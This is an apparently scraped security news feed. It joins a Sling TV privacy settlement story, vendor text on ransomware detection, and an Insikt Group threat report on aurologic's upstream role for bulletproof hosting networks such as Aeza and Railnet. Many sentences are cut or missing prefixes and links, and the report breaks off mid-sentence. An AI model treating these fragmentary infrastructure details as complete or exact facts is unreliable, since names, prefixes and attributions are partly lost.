NetSec</source><content:encoded><![CDATA[Published  November 3, 2025 This Android Security Bulletin contains details of security vulnerabilities

The company will pay $530,000 after being accused of making it difficult for customers to opt out of its data collection practices.The California Consumer Privacy Act (CCPA) says consumers must be able to easily see how companies use their data and opt out if they choose. But according to a press release from the Attorney General’s office, Sling misled users who tried.When users attempted to opt out of having their data shared, Sling redirected them to a page for changing cookie settings. Cookies are small files that help websites recognize users and track activity. However, changing the cookie controls on this page didn’t actually stop data sharing. To do that, users had to find and fill out a separate online form—even logged-in customers had to provide their name, address, email, and phone number, which Sling already had.Users couldn’t opt out from connected devices either. Instead, they had to manually type a complex URL into a separate browser, the complaint said.Children in the crosshairsSling also failed to protect children’s privacy. It didn’t age-screen users or offer kids’ profiles that avoided targeted advertising. The company even bought data from brokers to build detailed viewer profiles—including information about children in the home, the complaint alleged.“Sling TV uses data about the presence of children in the household, and, in some cases, their age ranges, to build specific groups of viewers that can be targeted for cross-context behavioral advertising.”Falling subscriber numbers, rising revenueSling has been losing subscribers fast—down to 1.78 million—but it’s still making more money per viewer. How? By raising prices and leaning on targeted advertising, the very practice that just got it fined. Sling is a division of DISH Media, which says in its marketing material:“DISH Media is helping brands and agencies reimagine their media mix to maximize return on ad spend… helping advertisers optimize reach, frequency, and return on investment through more strategic platform planning.”What the settlement changes (and what it doesn’t)Under the settlement, Sling TV must stop sending users who opt out to a cookie settings page, stop requiring logged-in users to fill out forms with data it already holds, and add a direct opt-out mechanism to its app. It must also let parents create kids’ profiles and explain how to protect children’s privacy.This is Sling’s first major privacy violation, but DISH Network has faced scrutiny before. In 2020, it paid a $210 million penalty—the largest ever under the FTC’s Telemarketing Sales Rule—for making millions of unlawful telemarketing calls.We don’t just report on data privacy—we help you remove your personal informationCybersecurity risks should never spread beyond a headline.

To keep ahead, organizations can no longer rely on traditional signals for ransomware detection. Instead, detection tools and techniques must be informed by timely, relevant data to stay ahead of threat actors.With high-velocity data organizations gain near-immediate threat detection, faster incident response, continuous visibility, and reduced dwell times. Together, these dramatically reduce the likelihood of breach and mitigate the impact when they do occur.Modern ransomware continues to present a host of challenges for organizations the world over. From ever-evolving attack techniques and encrypted traffic to insider threats and alert fatigue, today’s ransomware landscape is a significant hurdle for organizational cybersecurity.Nonetheless, solutions exist. With modern ransomware detection and prevention solutions like Recorded Future’s, organizations gain access to timely, customized, and contextualized intelligence, informed and empowered by AI-driven automation, continuous monitoring, and more.The Growing Threat of RansomwareRansomware has long been a defining feature of the cybersecurity threat landscape. However, in recent years, its evolution has accelerated dramatically, growing in volume, velocity, and sophistication at a dizzying pace. With the rise of ransomware-as-a-service (RaaS), AI-enabled threats, and more sophisticated, personalized attack techniques, ransomware has become not only more prevalent but also more devastating than ever before.Ransomware attacks rose 37% in the past year and now account for nearly half of all breaches.In such a fast-moving and sophisticated threat landscape, the only way to detect and defend against ransomware is for organizations to evolve just as rapidly. With so much at stake, prevention (not remediation) must remain the primary goal. And in order to achieve that, organizations require real-time, intelligence-led visibility across every layer of the digital ecosystem. Simply put, modern ransomware detection depends on timely, relevant data that empowers defenders to outpace and outthink their adversaries.Why Traditional Ransomware Detection Doesn’t Work AnymoreAt its core, ransomware detection refers to the suite of techniques and controls designed to identify the signs of a ransomware operation early enough to prevent or limit its impact. Effective detection involves continuous monitoring: before encryption (during reconnaissance and lateral movement), during execution, and even after impact (for containment and response).However, traditional, legacy approaches to ransomware detection were designed for a threat environment that no longer exists. Signature-based and static methods—once the backbone of detection strategies—have proven inadequate against today’s rapidly changing ransomware families and attack TTPs.Legacy Detection Techniques and Their LimitationsSignatures and Indicators of Compromise: Detection once relied on byte patterns, file hashes, and known ransom notes or IP addresses. These methods fail as attackers rapidly rotate infrastructure or tweak binaries to evade detection.Static Analysis and Simple Heuristics: Older tools flagged obvious indicators (e.g. packed binaries, crypto routines, or known encryption loops) but struggle with today’s polymorphic malware, which changes form with each iteration.Network Intrusion Detection System Rules: Intrusion detection once depended on recognizing known command-and-control patterns. But adversaries now use encrypted, malware-free communications, rendering these rules practically obsolete.The RaaS economy has only made the churn and development of new ransomware variants all the more rapid, while techniques such as partial or intermittent encryption help adversaries evade file-based detection entirely. As a result, even well-maintained detection systems often miss early warning signs, identifying ransomware only after significant damage has been done.This is why it’s imperative for organizations today to make the shift from this more traditional, reactive model of ransomware defense to a proactive, intelligence-driven approach that can detect and disrupt novel threats as they take shape.Key Technologies Driving Modern Ransomware DetectionThankfully, there are key technologies helping to enable this fundamental shift. Cutting-edge ransomware detection is no longer a single product or process. It’s a synergistic ecosystem of technologies designed to outpace the ever-evolving operations of today’s threat actors. Four key technologies are leading this transformation:Continuous intelligence gathering—from open sources, dark web forums, and global telemetry—allows organizations to anticipate ransomware threats before they strike. Integrated directly into SIEM and SOAR systems, high-velocity threat intelligence provides automated alerts on emerging ransomware groups, infrastructure changes, and exploit trends.2. Machine Learning and Artificial IntelligenceML and AI models identify complex behavioral patterns that static systems miss. Using supervised and unsupervised learning, these technologies can detect anomalies like unusual encryption rates or lateral movement across hosts. Increasingly, deep learning models trained on ransomware behavior datasets are enabling early identification of zero-day ransomware attacks before they spread.Rather than matching known signatures, behavioral analytics establish a baseline of normal user and system behavior, then flag deviations such as mass file modifications or atypical privilege escalation. Integrated within EDR/XDR platforms, this approach helps detect ransomware in near real-time, often before file encryption begins.4. Integration and AutomationModern ransomware detection thrives on speed and coordination. Integration across security systems through SOAR frameworks allows machine-speed correlation and automated response. When threat intelligence, AI-driven analytics, and behavioral monitoring are unified, organizations achieve both accuracy and agility in their ransomware defense.5. Attack Surface ManagementAttack surface management allows security teams to view their external attack surface the same way an attacker would. This helps security teams identify and eliminate potential attack vectors and exploitation opportunities, such as shadow IT, legacy services, and unpatched systems.The future of ransomware detection lies in continuous learning and proactive analytics—staying one step ahead of adversaries with the right information, delivered at the right time.The Role of Timely, Relevant Data in Modern Ransomware DetectionIn order for these technological advancements to deliver real value, however, organizations must have access to timely, relevant data. Modern ransomware is dynamic, distributed, and data-driven, and effective detection must be the same. The traditional paradigm of periodic scanning or post-incident forensics is no longer up to the task. Instead, organizations should turn to as near-real-time data analysis as possible and make that the cornerstone of their ransomware defenses.What Constitutes Timely, Relevant Data in the Realm of CybersecurityIn the cybersecurity context, timely and relevant data is information that’s collected, processed, and analyzed as close to the moment it’s generated, and as close to one’s current position and posture in the threat landscape, as possible. This data should provide a continuously up-to-date view of the organization’s environment, and the most pertinent, relevant threats surrounding it. Sources of such data include:Continuous External threat intelligence to identify ongoing campaigns and TTPs from EDR or XDR platforms and identity logsSystem performance metrics and process behavior analyticsAlerts from Security Information and Event Management (), Security Automation, Orchestration and Response (), and intrusion detection systemsWith this continuous stream of timely and high-value telemetry, organizations can detect the earlier, more subtle signs of ransomware, such as unusual encryption patterns, privilege escalation attempts, or a sudden spike in outbound network traffic to command-and-control servers.Why Timely, Relevant Data MattersTo take a closer look at how these data streams empower organizations in the battle against ransomware, let’s look at a few of the concrete outcomes they enable:Immediate Threat DetectionTimely analysis allows security systems to flag anomalies like mass file renaming or suspicious encryption as they occur. Machine learning and behavioral analytics models depend on this instant feedback loop to generate early, accurate alerts.Automated responses (e.g. isolating compromised endpoints or terminating malicious processes) can be triggered within seconds of detection. This degree of speed can make the difference between a minor, contained event and an enterprise-wide crisis.Live data dashboards and threat maps provide teams with ongoing, dynamic situational awareness, helping them connect the dots across multiple systems. Correlating user behavior, process activity, network signals, and the like allows organizations to establish a unified, informed security posture.“Dwell time”, or how long it takes before an attacker is detected, directly impacts the severity of an attack. Timely, relevant intelligence can shrink that window from weeks to minutes, dramatically reducing data loss, downtime, and other harmful effects of ransomware attacks.Timely, relevant data is the heartbeat of modern ransomware defense—transforming cybersecurity from a reactive practice to a proactive one.At the end of the day, without this level of visibility, even the most advanced detection tools risk falling behind the speed and sophistication of contemporary ransomware campaigns. That’s why it’s of the utmost importance that organizations ensure their threat intelligence data is as timely and relevant as possible, avoiding both compromise and alert fatigue.Overcoming the Challenges of Ransomware DetectionDespite major technological advances, ransomware detection remains a constant arms race. Threat actors continue to evolve quickly, exploiting both technical blind spots and human error and fatigue. Below are some key challenges facing organizations today, as well as some strategies for overcoming them.Evolving Attack Techniques:Attackers continuously modify code, delivery methods, and encryption algorithms to evade detection. Polymorphic and fileless ransomware, operating directly in memory, bypass traditional antivirus entirely.False Positives and Alert Fatigue:Ransomware detection systems sometimes misclassify legitimate behavior (like mass file updates) as indications of ransomware. Over time, these false positives may lead to alert fatigue. And, without sufficient context, analysts may overlook genuine threats amidst the noise.Encrypted and Obfuscated Traffic:Increasing use of TLS/SSL encryption for malicious traffic makes distinguishing between normal, benign traffic and dangerous activity difficult.Insider Threats and Compromised Credentials:Ransomware leveraging stolen account credentials is on the rise and incredibly difficult to detect early on, as it often looks like normal user activity.Advanced Mitigation StrategiesBehavioral and Anomaly-Based Detection:Deploying models that understand “normal” operations enables faster detection of deviations, including never-before-seen ones.Endpoint Detection and Response (EDR):Continuous process and memory monitoring detects ransomware-like behavior before an attack is fully executed.Continuous Threat Intelligence Integration:Global intelligence feeds detection engines with the latest on ransomware families, indicators of compromise, and tactics.Proactive Threat Hunting:Behavioral threat hunting and retrospective analysis help identify ransomware precursors (e.g. credential harvesting or lateral movement) before encryption begins.While today’s evolving ransomware landscape presents a host of challenges to modern organizations, there are tools and strategies available to help mitigate these threats. By utilizing the latest technologies and integrating proactive strategies into one’s security operations, organizations can stay two steps ahead of the latest ransomware threats.How Recorded Future Can HelpIn this escalating landscape, Recorded Future empowers organizations with the timely, customized, and relevant intelligence needed to detect, prevent, and respond to ransomware attacks before they take hold.With its Ransomware Mitigation Capabilities, Recorded Future proactively addresses threats across the entire attack lifecycle.

KG in Langen, Germany. The company markets itself as a high-capacity European carrier, providing dedicated and cloud server hosting as well as data center colocation, IP transit services, and distributed denial-of-service (DDoS) protection to commercial and enterprise customers. Despite its core focus on legitimate network and data center operations, aurologic has emerged as a hub for some of the most abusive and high-risk networks operating within the global hosting ecosystem.Although it is not possible to confirm why so many of aurologic’s known downstream customers form such a large concentration of high-risk hosting networks, the fact that the company serves as a common link between multiple suspected TAEs is significant. There are likely multiple contributing factors, including aurologic’s self-proclaimed neutrality, its continued provision of upstream connectivity to sanctioned entities such as Aeza, and the perception of limited enforcement risk within the European regulatory environment. Collectively, these factors may have made aurologic an attractive option for high-risk providers seeking operational stability and resilience.Insikt Group assesses that aurologic's case exemplifies the broader structural challenges surrounding accountability within the hosting ecosystem. Upstream providers occupy a pivotal position within the internet’s infrastructure hierarchy and are uniquely positioned to disrupt persistent abuse. Yet many continue to defer responsibility for downstream activity, intervening only when legally compelled. While neutrality remains a foundational principle of internet governance, in practice, it has become a rationale for inaction, enabling networks repeatedly associated with cybercrime, disinformation, and other forms of abuse to persist. Meaningful progress against such activity can be made by upstream providers acting not solely out of legal obligation, but from an operational and ethical responsibility to prevent the misuse of the infrastructure.aurologic has become a central nexus within the global high-risk hosting ecosystem, repeatedly appearing as a common upstream provider.aurologic’s continued service to sanctioned and abuse-heavy networks demonstrates a practice of legal compliance over risk avoidance.aurologic’s reactive-based abuse handling exemplifies the systematic gap between legal neutrality and operational responsibility within the global hosting ecosystem.aurologic GmbH emerged in October 2023 as a German hosting provider built on the infrastructure and autonomous system number (ASN) AS30823, which was previously operated by combahton GmbH under the fastpipe[.]io brand. In November 2023, combahton GmbH formally announced its full transition into aurologic GmbH, cementing the rebrand and continuity of operations. aurologic markets a multi-terabit backbone across Europe, with its primary facility located at Tornado Datacenter GmbH & Co. KG. Both companies are headed by Joseph Maximilian Hofmann, who has served as CEO of aurologic since September 2015 and of Tornado Datacenter since April 2022.Since its inception in 2023, aurologic has been repeatedly cited in intelligence reporting and forums for its role in the broader hosting ecosystem supporting questionable or illicit activity. For example, Qurium’s report on the Doppelgänger disinformation network identified aurologic as one of the German upstream providers enabling Russia-linked infrastructure, maintaining long-standing relationships with hosting providers such as WAIcore Hosting Ltd (AS210281), Daniil Yevchenko (under the brand Altawk; AS203727), and EVILEMPIRE, aka Tnsecurity Ltd (AS216309). Community discussions have further scrutinized aurologic’s ongoing connectivity with Aeza International Ltd, an entity under US sanctions and, more recently, UK sanctions, despite Hofmann’s defense on public forums that Aeza Group LLC was not its “contractual customer.” Hoffman further defended the relationship by emphasizing low abuse volumes, proactive investigations, and compliance with German law. Nevertheless, routing evidence as of writing confirmed that aurologic remained a primary upstream to Aeza International Ltd (AS210644), reinforcing concerns around its continued upstream role.Beyond Aeza, aurologic has also appeared as a transit provider for some of the largest concentrations of suspected threat activity enablers tracked by Insikt Group, including metaspinner net GmbH, Femo IT Solutions Limited, Railnet LLC, Global-Data System IT Corporation, and more. These relationships position the company at the center of ongoing industry debates about infrastructure abuse and due diligence.Infrastructure and Routingaurologic maintains an extensive European interconnection footprint spanning key data centers across Germany, Finland, and the Netherlands. Its infrastructure is anchored in major European internet hubs in both Langen and Amsterdam, where the company maintains direct connections with large colocation facilities. These datacenters serve as central exchange points where networks, content delivery providers, and hosting companies interconnect to exchange traffic efficiently. By maintaining a presence in multiple facilities, aurologic ensures fast, redundant, and high-volume data transit across Europe.This level of connectivity makes aurologic an attractive upstream provider for a range of hosting companies, including those operating in ambiguous or opaque areas of the hosting ecosystem. Whether through technical neutrality, permissive policy, or limited oversight, aurologic’s infrastructure effectively provides a degree of protection and continuity to providers with a reputation for hosting malicious activity. As a result, aurologic sits in a complex position in the hosting landscape, where connectivity and enablement obscure the difference between infrastructure provider and facilitator. This dynamic sets the stage for understanding how aurologic’s network can serve as a foundation for persistent malicious infrastructure and why it plays such a critical role in enabling a broader ecosystem of threat activity.While aurologic’s broad connectivity footprint underpins its strength as a transit provider, it also introduces an enabling function within the threat infrastructure ecosystem. Its combination of network reach, capacity, and perceived permissiveness appears to appeal to questionable hosting providers seeking stable transit relationships that face fewer disruptions from abuse reporting or network-level mitigation efforts. Insikt Group identified more than a dozen TAEs using aurologic for upstream connectivity, ranging from sanctioned entities to self-proclaimed bulletproof hosting providers. The TAEs discussed in this section represent the most significant examples, having displayed some of the highest levels of validated malicious infrastructure within Recorded Future’s Network Intelligence relative to their announced IP space. A full list of active networks analyzed by Recorded Future and linked to aurologic can be found in .Aeza Group is a Russian hosting provider established in 2021 that primarily operates through its UK-registered company, Aeza International Ltd (AS210644). Since its inception, Aeza has become a well-known TAE, enabling cybercriminal and state-aligned operations through resilient, abuse-tolerant infrastructure. At the time of writing, approximately 50% of Aeza International’s announced IP prefixes are routed via aurologic, highlighting its continued dependence on the German provider for upstream connectivity.Insikt Group highlighted Aeza as one of the most prominent sources of validated malicious infrastructure in the Recorded Future 2024 Malicious Infrastructure Report, detailing its role in enabling a range of threats, including ransomware and infostealers, and citing its significant role in the Russian disinformation network Doppelgänger. After the release of Qurium’s Doppelgänger report in July 2024, Aeza revealed in August 2024 that DataCamp Limited (AS60068), a UK-based hosting provider, had terminated its contract, and that, as a result, Aeza partnered with aurologic to continue operations (). Aeza’s continued operations have since prompted law enforcement and regulatory responses from Russia, the United States, and the United Kingdom.A post from “mw” on the forum LowEndTalk quoting Aeza (Source:In April 2025, Russian authorities arrested Aeza Group co-founders Yurii Meruzhanovich Bozoyan and Arsenii Aleksandrovich Penzev on charges related to their alleged involvement in operating the darknet drug marketplace BlackSprut. The arrests followed an April 1 raid by the Federal Security Service (FSB) on Aeza’s Saint Petersburg headquarters, located in the former Wagner PMC Center.Both Bozoyan and Penzev were charged under Articles 210 and 228.1 of the Russian Criminal Code for participation in an organized criminal group and large-scale drug trafficking. Russian media reports described the two as having provided the “technical base” for BlackSprut’s operations, which Aeza hosted through its UK-registered entity, Aeza International Ltd.On July 1, 2025, the US Department of the Treasury’s Office of Foreign Assets Control (OFAC), incoordination with the UK’s National Crime Agency (NCA), sanctioned Aeza Group and its affiliated companies, labeling them a “bulletproof hosting services provider.” OFAC attributed Aeza Group infrastructure to operations involving BianLian ransomware, Lumma and Meduza infostealers, and RedLine Stealer.The list of designated companies includes:Aeza International Ltd (UK branch)Aeza Logistic LLC (Russia-based subsidiary)Cloud Solutions LLC (Russia-based subsidiary)On September 19, 2025, the UK government followed the OFAC action by sanctioning the UK-registered Aeza International Ltd, citing its involvement in “destabilizing Ukraine by providing internet services to Russian disinformation campaigns.” However, at the time of writing, Aeza International remains a legally registered company in the United Kingdom and has yet to be struck off the company register.Despite the arrests of its co-founders and the imposition of sanctions, Aeza has demonstrated a sustained ability to reallocate its infrastructure. Rather than signaling operational decline, these actions appear to have prompted a rapid reorganization of assets aimed at preserving control over key network resources and maintaining service continuity.Within 24 hours of OFAC’s July 2025 sanctions, Insikt Group observed Aeza begin to reallocate its US IP resources to a Serbian organization under the name Smart Digital Ideas DOO, an entity registered mere hours after OFAC announced the sanctions (see ). Insikt Group assessed with high confidence that this was intended to retain control of any assets affected by the OFAC sanctions.RIPE organization record for Smart Digital Ideas (Source:On July 3, 2025, Insikt Group identified the emergence of Hypercore Ltd, a UK-registered company with infrastructure directly linked to Aeza. On July 4, 2025, Hypercore Ltd was re-assigned IP prefix  from Smart Digital Ideas DOO, an allocation which was created only one day prior (see ). 45[.]142[.]122[.]0/24 reallocation to Hypercore Ltd (Source: RIPEstat)On July 7, 2025, Smart Digital Ideas DOO was assigned ASN AS215829 in the RIPE database (see ). Notably, the sponsoring org ORG-AIL64-RIPE was Aeza International Ltd, and the AS object also contains references tracing back to Cloud Solutions LLC.RIPE objects associated with Smart Digital Ideas AS215829 (Source: RIPE)Aeza has remained a prominent source of malicious activity throughout 2025. Based on Recorded Future® Malware Intelligence, Insikt Group identified multiple malware samples exhibiting network connections to AS210644. These samples predominantly included infostealers and remote access trojans (RATs) such as AsyncRAT, Destiny Stealer, Meduza Stealer, REMCOS RAT, Rhadamanthys Stealer, RisePro Stealer, and QuasarRAT.Insikt Group’s recent analysis of the pro-Russian group DDoSia further highlighted Aeza’s continued role in the cybercrime landscape, with Aeza International Ltd (AS210644) accounting for 7.5% of all identified Tier 1 command-and-control (C2) servers between July 2024 and July 2025 (see ). Also of note, other ASs using aurologic’s services collectively accounted for a further 6% of observed C2 infrastructure, while approximately 13.5% of DDoSia Tier 1 C2 IP addresses were announced either directly by aurologic or by ASNs receiving upstream transit from it.Femo IT Solutions LimitedFemo IT Solutions Limited (AS214351) is a UK-incorporated organization that, despite announcing only two  prefixes, has consistently displayed one of the highest concentrations of validated malicious infrastructure relative to its size, according to Recorded Future Network Intelligence. IP addresses announced by Femo IT Solutions hosted C2 infrastructure for Cobalt Strike, DcRat, Rhadamanthys Stealer, TinyLoader, and THC Hydra. Furthermore, Recorded Futures Malware Intelligence highlighted a number of malware samples exhibiting network connections to Femo IT Solutions infrastructure, such as Amadey, Aurotun, QuasarRAT, RedLine Stealer, REMCOS RAT, Stealc, SystemBC, and SvcStealer.Femo IT Solutions' IP prefixes  and  are both routed exclusively via aurologic (see ).Femo IT Solutions routing (Source:IP prefix  is directly controlled by Femo IT Solutions. The prefix was assigned from a larger  block belonging to the Iranian Research Organization for Science and Technology (IROST), a government-controlled body under Iran’s Ministry of Science, Research and Technology. Sub-allocations from this space have also been leveraged by other suspected TAEs tracked by Insikt Group, including Aeza entities Aeza International (AS210644), Hypercore Ltd, and Smart Digital Ideas DOO, as well as Global Connectivity Solutions and Global Internet Solutions (see ).The second announced prefix, , is attributed to New Way LLC, a company registered in Oman. This allocation derives from a  netblock controlled by Iranian internet service provider (ISP) Farahoosh Dena PLC, which offers data center and hosting services. The RIPE object for this range lists contradictory details, including a Philadelphia residential address and an Omani registration ().The network relies exclusively on Aurologic for upstream connectivity and shows clear operational ties to the bulletproof hosting provider Defhost (see ).Defhost emphasizes “fast abusive VPD/VDS” with resilience against takedown efforts by any government, specifically Western law enforcement, and anti-abuse organizations such as “The Spamhaus Project,” while simultaneously assuring customers that its operations will remain uninterrupted. Insikt Group assesses with high confidence that Femo IT Solutions is under the control of Defhost.Global-Data System IT CorporationGlobal-Data System IT Corporation (AS42624), also recognized under the name SWISSNETWORK02, emerged in July 2024 following the transfer of ASN resources from Simple Carrier LLC (). Within just over a year of operation, the network accumulated one of the highest concentrations of malicious activity observed in Recorded Future’s Network Intelligence, ranking within the top ten for malicious activity density as of September 2025. Its infrastructure has hosted a wide range of malware families, including Cobalt Strike, Sliver, QuasarRAT, Remcos Rat, Dark Crystal RAT, Latrodectus, Amadey, and multiple stealer families such as Rhadamanthys, RedLine Stealer, and Meduza.Simple Carrier LLC transferring AS34888 and AS42624 to Global-Data System IT Corporation (Source: RIPE DB)Insikt Group has assessed with medium confidence that Global-Data System IT Corporation is closely tied to PrivateAlps, an offshore privacy-centric hosting provider registered in Switzerland that openly advertises no Know-Your-Customer (KYC) policies, Digital Millennium Copyright Act (DMCA)-ignored hosting, and Tor-friendly infrastructure.Beyond malware hosting, the infrastructure has supported DDoSIA, Socks5Systemz, and other commodity malware ecosystems. It has also been leveraged in targeted campaigns, such as TAG-144’s operations against Latin American governments.All of Global-Data System IT Corporation’s active prefixes are routed solely through aurologic. Routing graphs from September 2025 confirm that all eleven IPv4 prefixes are routed through aurologic, with no diversification, making aurologic the critical enabler of Global-Data System IT Corporation’s reach and resilience.By anchoring its connectivity to a German upstream like aurologic, Global-Data Systems IT Corporation maintains global availability despite repeated associations with malicious infrastructure. Global-Data System IT Corporation’s reliance on a single upstream provider creates a natural single point of failure that could, if interrupted, materially disrupt its operations. The persistence of this arrangement, however, highlights how aurologic’s connectivity enables the network’s reach and suggests permissive or insufficient vetting practices, consistent with patterns observed in other aurologic-linked suspected TAEs such as metaspinner net GmbH and Railnet LLC.Metaspinner net GmbH (AS209800) was a recently registered autonomous system created on April 25, 2025, and was announced exclusively through aurologic (). The name “metaspinner net GmbH” had long since been associated with a legitimate Hamburg-based software company. However, multiple factors indicate that the autonomous system “metaspinner” was not controlled by the same entity, but rather by threat actors likely affiliated with Virtualine Technologies.Since its inception, AS209800 has accumulated a substantial malicious footprint. Recorded Future has observed infrastructure within the ASN hosting a wide array of malware families and related tooling, including loaders like TinyLoader and SmokeLoader, information stealers such as Stealc, Amadey, and Phorpiex, and multiple remote access trojans, including AsyncRAT, njRAT, QuasarRAT, Dark Crystal RAT, and REMCOS RAT. Botnets such as Moobot, as well as post-exploitation frameworks like Cobalt Strike, have also been detected. These observations align with Spamhaus, which has recently taken notice of the high volume of suspicious activities appearing from the network within a short timeframe.*: AS209800 appearing downstream from AS30823, aurologic GmbH, on October 3, 2025 (Source: bgp[.]tools)*As of October 3, 2025, AS209800 originated twelve IPv4 prefixes within the ranges , , and . According to RIPE, none of these IPv4 blocks are owned by metaspinner. Instead, they are sub-allocated from a Turkish local internet registry (LIR) MGN Teknoloji Anonim Sirketi, headquartered in Istanbul (). This LIR also sponsors several other suspicious ASNs, all of which were created in 2025 ().*: Visualization of IPv4 prefixes being assigned to metaspinner. (Source: Recorded Future)*
        AS209800’s historical footprint further suggests possible repurposing. AS209800 briefly advertised an IPv6  in December 2020 before going dormant, only to reemerge in 2025 with entirely new IPv4 address spaces and links to MGN Teknoloji. While no official transfer was logged in RIPE, the shift in behavior suggests the ASN was taken over or reallocated, a tactic consistent with other impersonation incidents observed in the same timeframe, such as VSVK Onderhoud B.V. (AS213511).Irregularities are evident in domain registrations. The legitimate software company by the same name, metaspinner, used to operate the domain  and , which over time redirected to its current domain,  (see ). The domain , originally lapsed in the mid-2000s, was re-registered on April 18, 2025, initially through URL Solutions, Inc., and later its record was updated to reflect its registrar as NiceNIC, a registrar known for abuse-tolerant practices.*: The legitimate software company metaspinner net gmbH listed on the US version of* preispiraten[.]de pricepirates[.]com  pricepirates[.]com*: Preispiraten (aka Pricepirates) listed as a service of metaspinner net GmbH on the “Imprint” page (Source:* preispiraten[.]deAt the time of analysis,  was hosted at IP address  which Insikt Group assesses with high confidence to be associated with Virtualine Technologies. Both RIPE and WHOIS data for the domain list a virtual office address in London’s 71-75 Covent Garden, an address previously used by organizations tied to Virtualine Technologies. Historical IP hosting records for  show that  operated on shared infrastructure with domains linked to Virtualine Technologies, such as  and . Historical IP hosting records also show that it shared infrastructure with , a domain once associated with VSVK Onderhoud B.V. (AS213511). Furthermore,  is also hosting four additional suspicious hosting-related domains: , , a, and . More details on the significance of these domains and their connection to Virtualine Technologies are outlined in the next subsections.The name of a legitimate Dutch construction firm, VSVK Onderhoud B.V., was used to register AS213511 on January 27, 2025. The legitimate VSVK Onderhoud operates exclusively in the Netherlands and has no IT or telecommunications business. According to historical WHOIS data, AS213511 was observed having Railnet LLC (AS214943) as its upstream provider. Railnet LLC notably has strong ties to Virtualine Technologies. This observed incident underscores an emerging pattern in AS-level impersonation campaigns, where threat actors may fabricate corporate identities and leverage legitimate-seeming infrastructure to enable phishing and IP hijacking schemes. As of writing, AS213511 is no longer observed on the global routing table.Proxio ( appears to be a newly established proxy service with notable connections to Virtualine Technologies. Proxio has been recently advertised across dark web and underground forums, positioning itself as a high-speed residential or mixed proxy provider. Notably, a forum user operating under the alias “Secury” on BlackHatWorld Forum, with a Virtualine Technologies logo as the profile picture, was observed promoting the Proxio service (see ). This overlap in branding and infrastructure strongly reinforces the likelihood that Proxio and Virtualine Technologies are linked.*: BlackHatWorld user “Secury” advertising Proxio (Source: BlackHatWorld)*Anti-Red Hosting (claims to be providing “Anonymous Anti-Red Bulletproof Hosting,” with its domain registration also listing a virtual office address in London’s Covent Garden.

This shift occurred at the peak of malicious activity on the network, with Recorded Future’s Network Intelligence identifying over 76 validated C2 servers.*: Prefixes once observed under “METASPINNER” (AS209800) are now showing a description of “LANEDONET” as of October 22, 2025 (Source:* *: An example of one of metaspinner’s IPv4 prefixes being reassigned to lanedonet (Source:* Lanedonet Datacenter was registered with RIPE on the same day of the IP prefix transfers from metaspinner, with a listed address of Strawinskylaan 3051 1077 ZX, Amsterdam.

There is currently only one RIPE resource assigned to Lanedo GmbH at the time of writing, IPv6 prefix .Insikt Group assesses with high confidence that the threat actor(s) behind metaspinner have mirrored their technique of impersonating a legitimate company when setting up , pivoting from metaspinner, as the network had come under increased scrutiny due to its high volume of malicious traffic.Railnet LLC (AS214943) was incorporated in April 2024 and, within its first year of operation, quickly emerged as one of the most abuse-heavy networks tracked by Recorded Future. Infrastructure hosted in Railnet’s space has supported over 30 malware families, including DarkComet, Amadey, Remcos RAT, Latrodectus, Dark Crystal RAT, and commodity stealers such as Rhadamanthys, StealC, Vidar, and Lumma.Railnet is formally registered in Kentucky under an address linked to an organization named Whitelabel Networks LLC, and an incorporation agent tied to several other questionable hosting entities. While Kentucky is not a traditional secrecy jurisdiction, the choice of state and use of mail-drop offices suggest an effort to reduce visibility by avoiding more obvious havens, such as Delaware or offshore jurisdictions.According to routing data observed on August 28, 2025, Railnet originated nineteen IPv4 prefixes, of which approximately 95% are routed via aurologic (), with only a single  range being routed through another German provider, Pfcloud UG.Railnet LLC’s routing through aurologic GmbH as of August 28, 2025 (Source:bgp[.]tools)Railnet’s operational significance lies not just in the malware hosted directly, but in its role enabling multiple bulletproof hosting entities like Virtualine Technologies, DripHosting (DiorHost), and RetryHost.Virtualine Technologies, a Russia-linked bulletproof hoster that openly advertises on Russian-language forums, leases at least fourteen prefixes originated by Railnet (). These prefixes are often registered to various LIRs, which are then announced via Railnet, allowing Virtualine to mask ownership while maintaining operational control. Virtualine’s registration address in London’s 71-75 Covent Garden, a hub for shell entities, has also been associated with other suspected TAEs, including Stark Industries Solutions, Aeza International Ltd, and Global Connectivity Solutions LLC.*: IP sub-allocation from Rapidnet to Virtualine Technologies, routed through Railnet LLC (Source:* Railnet originates multiple prefixes used by DripHosting, a provider that brands itself interchangeably as DiorHost ().

RetryHost explicitly markets itself as “bulletproof,” and overlapping infrastructure suggests close coordination or common backend management between Railnet and RetryHost.*: IP sub-allocation from Telco Power Ltd to RetryHost, routed through Railnet LLC (Source:* These providers collectively demonstrate how Railnet acts as a common backbone for “bulletproof” hosting operations, offering anonymity, routing resilience, and the ability to cycle short-lived leased prefixes to evade detection and blacklisting ().Railnet LLC’s observed prefixes from September 2024 to August 2025 (Source:By carrying the vast majority of Railnet’s traffic, aurologic effectively extends global reach to three separate bulletproof hosting brands that have been consistently tied to malware distribution, botnet infrastructure, and illicit VPS or RDP services. While Railnet’s operators leverage offshore formations, obscure company formations, and prefix cycling to obscure their footprint, the persistence of their upstream relationship with aurologic highlights a broader concern: the enabling role of established European networks in sustaining high-risk or high-abuse infrastructure.As of October 27, 2025, Recorded Futures Network Intelligence observed over 80 validated C2 servers on Railnets AS. This is likely a direct result of originating the twelve IPv4 prefixes transferred from metaspinner to Lanedo Datacenter ().The case with Railnet underscores a recurring theme: aurologic’s upstream connectivity does not appear incidental, but repeatedly visible in the routing paths of various TAEs. Railnet and other TAEs appear highly dependent on aurologic’s permissive transit to maintain continuity despite widespread abuse reporting.The Fine Line Between Neutrality and NegligenceThe persistence of aurologic’s upstream connectivity to multiple suspected TAEs raises a broader question that extends beyond any single provider: To what extent are such relationships the result of negligence, a failure to apply due diligence, as opposed to complicity, where providers knowingly accept or tolerate high-risk customers as a part of their business model? In the context of internet infrastructure, this distinction is critical but often difficult to prove. Transit providers occupy a unique position as gatekeepers of global connectivity. Their willingness or unwillingness to sever ties with abuse-heavy networks directly determines whether malicious infrastructure remains reachable.Negligence in this context often manifests as weak Know-Your-Customer (KYC) procedures, insufficient abuse handling, or a lack of proactive monitoring of downstream announcements. Many upstream networks argue they cannot fully control their downstream customers’ actions and rely on complaints to trigger action or simply redirect any abuse reporting to the customer in question, taking no further action. While aurologic has echoed a similar line of defense, typically directing abuse complaints to its abuse email address, hosting community members have offered anecdotal evidence stating otherwise ().*: LowEndSpirit Forum user “Encoders” describing no responses to abuse complaints (Source:* *: LowEndSpirit user “Treesmokah” pointing out that Hofmann’s Tornado Datacenter had been allegedly raided due to its relationship with 